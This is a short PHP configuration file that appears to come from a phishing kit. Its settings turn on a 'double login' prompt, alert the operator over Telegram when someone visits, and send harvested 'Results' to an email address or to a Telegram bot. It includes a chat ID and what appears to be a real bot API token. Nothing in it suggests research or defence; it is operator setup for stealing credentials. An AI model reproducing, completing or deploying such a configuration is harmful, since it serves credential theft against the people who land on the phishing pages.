<?php


$settings = array(
	"double_login"  => "1", // Double login 1 - on 0 - off
	"visit"		    => "1", // Send visit to telegram 1 - on 0 - off
	"send_mail"		=> "0", // Send Results to your E-Mail 1 - on 0 - off
	"telegram"		=> "1", // Telegram Bots Receiver 1 - on 0 - off
	"email"			=> "#", // Your E-Mail
	"chat_id"		=> "-1002572474047", // Chat ID Of You
	"bot_url"		=> "8129739191:AAHoyguwf2_ljMCvz0Omq1bG2XOHWg3_atI", // Your Bot API Key 
);

return $settings;

?>